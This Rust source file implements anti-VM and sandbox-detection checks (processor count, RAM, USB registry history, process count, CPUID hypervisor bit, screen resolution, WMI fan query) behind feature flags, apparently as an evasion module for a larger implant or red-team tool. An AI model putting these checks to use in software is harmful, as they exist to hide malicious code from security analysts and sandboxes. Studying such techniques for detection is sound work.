// =======================================================================================================
// ANTI-VM CHECKS
// Techniques to detect if the process is running in a virtual machine
// =======================================================================================================

use std::mem::size_of;

#[cfg(feature = "CheckAntiVMCPU")]
use windows_sys::Win32::System::SystemInformation::{GetSystemInfo, SYSTEM_INFO};

#[cfg(feature = "CheckAntiVMRAM")]
use windows_sys::Win32::System::SystemInformation::{GlobalMemoryStatusEx, MEMORYSTATUSEX};

#[cfg(feature = "CheckAntiVMUSB")]
use windows_sys::Win32::System::Registry::{
    RegCloseKey, RegOpenKeyExA, RegQueryInfoKeyA, HKEY, HKEY_LOCAL_MACHINE, KEY_READ,
};

#[cfg(feature = "CheckAntiVMProcesses")]
use sysinfo::System;

// =======================================================================================================
// ANTI-VM CHECK: CPU Count
// =======================================================================================================

/// Function that performs a check on the CPU to find out how many processors the computer contains.
/// Virtual machines often have fewer than 2 processors.
#[cfg(feature = "CheckAntiVMCPU")]
pub fn anti_vm_cpu() -> bool {
    unsafe {
        let mut info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut info);

        // Access dwNumberOfProcessors through the union
        let processor_count = info.dwNumberOfProcessors;
        
        if processor_count < 2 {
            return true; // Possibly a virtualised environment
        }
    }

    false
}

// =======================================================================================================
// ANTI-VM CHECK: RAM Size
// =======================================================================================================

/// Function that performs a check of the current physical memory in bytes.
/// Checking if it is less than or equal to two gigabytes (common in VMs).
#[cfg(feature = "CheckAntiVMRAM")]
pub fn anti_vm_ram() -> bool {
    unsafe {
        let mut info: MEMORYSTATUSEX = std::mem::zeroed();
        info.dwLength = size_of::<MEMORYSTATUSEX>() as u32;

        if GlobalMemoryStatusEx(&mut info) != 0 {
            // Check if RAM is less than or equal to 2GB (2 * 1073741824 bytes)
            if info.ullTotalPhys <= 2147483648 {
                return true; // Possibly a virtualised environment
            }
        }
    }

    false
}

// =======================================================================================================
// ANTI-VM CHECK: USB History
// =======================================================================================================

/// The SYSTEM\ControlSet001\Enum\USBSTOR directory in the Windows Registry is a specific location where the operating system
/// stores information about USB storage devices that have been connected to the computer.
/// 
/// Possibly if the computer didn't have 2 USB devices mounted, it may be in a virtualised environment.
#[cfg(feature = "CheckAntiVMUSB")]
pub fn anti_vm_usb() -> bool {
    unsafe {
        let mut h_key: HKEY = std::ptr::null_mut();
        let mut usb_number: u32 = 0;
        let mut class_name_buffer = [0u8; 256];
        let mut class_name_length: u32 = class_name_buffer.len() as u32;

        let registry_path = b"SYSTEM\\ControlSet001\\Enum\\USBSTOR\0";

        let result = RegOpenKeyExA(
            HKEY_LOCAL_MACHINE,
            registry_path.as_ptr(),
            0,
            KEY_READ,
            &mut h_key,
        );

        if result != 0 {
            return false; // Could not open key, assume not VM
        }

        let query_result = RegQueryInfoKeyA(
            h_key,
            class_name_buffer.as_mut_ptr(),
            &mut class_name_length,
            std::ptr::null_mut(),
            &mut usb_number,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        );

        RegCloseKey(h_key);

        if query_result == 0 && usb_number < 2 {
            return true; // Possibly a virtualised environment
        }
    }

    false
}

// =======================================================================================================
// ANTI-VM CHECK: Process Count
// =======================================================================================================

/// Check if the environment can be sandboxed through the number of processes running.
/// Sandbox environments typically have fewer than 50 processes.
#[cfg(feature = "CheckAntiVMProcesses")]
pub fn anti_vm_processes() -> bool {
    let mut system = System::new_all();
    system.refresh_all();

    let number_processes = system.processes().len();
    if number_processes <= 50 {
        return true; // Possibly a sandbox environment
    }

    false
}

// =======================================================================================================
// ANTI-VM CHECK: Hyper-V Detection
// =======================================================================================================

/// Check if the code is running in a Hyper-V virtual machine using CPUID.
/// The hypervisor presence bit (bit 31 of ECX) indicates if a hypervisor is present.
#[cfg(feature = "CheckAntiVMHyperV")]
pub fn anti_vm_hyperv() -> bool {
    is_virtual_machine()
}

#[cfg(feature = "CheckAntiVMHyperV")]
fn is_virtual_machine() -> bool {
    let mut eax = 0x1;
    let mut ecx = 0;

    unsafe {
        core::arch::asm!(
            "cpuid",
            inout("eax") eax,
            out("ecx") ecx,
        );
    }

    (ecx >> 31) & 0x1 == 1
}

// =======================================================================================================
// ANTI-VM CHECK: Screen Resolution
// =======================================================================================================

/// Check if the environment is virtual by examining screen resolution.
/// Virtual machines often have lower screen resolutions (below 1080x900).
#[cfg(feature = "CheckAntiVMResolution")]
use windows_sys::Win32::Foundation::{BOOL, LPARAM, RECT};
#[cfg(feature = "CheckAntiVMResolution")]
use windows_sys::Win32::Graphics::Gdi::{EnumDisplayMonitors, GetMonitorInfoW, HDC, HMONITOR, MONITORINFO};

#[cfg(feature = "CheckAntiVMResolution")]
pub fn anti_vm_resolution() -> bool {
    is_virtual_env_resolution_check()
}

#[cfg(feature = "CheckAntiVMResolution")]
fn is_virtual_env_resolution_check() -> bool {
    let mut result: BOOL = 0;

    unsafe {
        let success = EnumDisplayMonitors(
            std::ptr::null_mut(), // HDC
            std::ptr::null(),
            Some(resolution_callback),
            &mut result as *mut BOOL as isize, // LPARAM is isize
        );

        if success == 0 {
            return false; // Failed to enumerate monitors
        }
    }

    result != 0
}

#[cfg(feature = "CheckAntiVMResolution")]
unsafe extern "system" fn resolution_callback(
    monitor_handle: HMONITOR,
    _monitor_hdc: HDC,
    _rect: *mut RECT,
    data: isize, // LPARAM is isize in windows-sys
) -> BOOL {
    let result_ptr = data as *mut BOOL;
    
    let mut monitor_info = MONITORINFO {
        cbSize: std::mem::size_of::<MONITORINFO>() as u32,
        rcMonitor: RECT { left: 0, top: 0, right: 0, bottom: 0 },
        rcWork: RECT { left: 0, top: 0, right: 0, bottom: 0 },
        dwFlags: 0,
    };

    unsafe {
        if GetMonitorInfoW(monitor_handle, &mut monitor_info) == 0 {
            return 1; // Continue enumeration even if this monitor fails
        }
    }

    // Calculate the X coordinates of the display
    let x = monitor_info.rcMonitor.right - monitor_info.rcMonitor.left;
    // Calculate the Y coordinates of the display
    let y = monitor_info.rcMonitor.bottom - monitor_info.rcMonitor.top;

    // If resolution is below 1080x900, likely a VM
    if x.abs() < 1080 || y.abs() < 900 {
        unsafe {
            *result_ptr = 1; // Set to true (VM detected)
        }
    }

    1 // Continue enumeration
}

// =======================================================================================================
// ANTI-VM CHECK: CPU Fan Detection
// =======================================================================================================

/// Check if the environment is virtual by detecting CPU fans using WMI.
/// Virtual machines typically don't have physical fan instances.
#[cfg(feature = "CheckAntiVMFan")]
use std::collections::HashMap;
#[cfg(feature = "CheckAntiVMFan")]
use wmi::{COMLibrary, WMIConnection, Variant};

#[cfg(feature = "CheckAntiVMFan")]
pub fn anti_vm_fan() -> bool {
    match check_fan_instances() {
        Ok(is_vm) => is_vm,
        Err(_) => false, // On error, assume not a VM
    }
}

#[cfg(feature = "CheckAntiVMFan")]
fn check_fan_instances() -> Result<bool, Box<dyn std::error::Error>> {
    // Initialize COM library and WMI connection
    let com_lib = COMLibrary::new()?;
    let wmi_con = WMIConnection::new(com_lib)?;

    // Execute raw WMI query for Win32_Fan
    let results: Vec<HashMap<String, Variant>> = wmi_con.raw_query("SELECT * FROM Win32_Fan")?;
    
    // If no fan instances found, likely running in a VM
    Ok(results.is_empty())
}
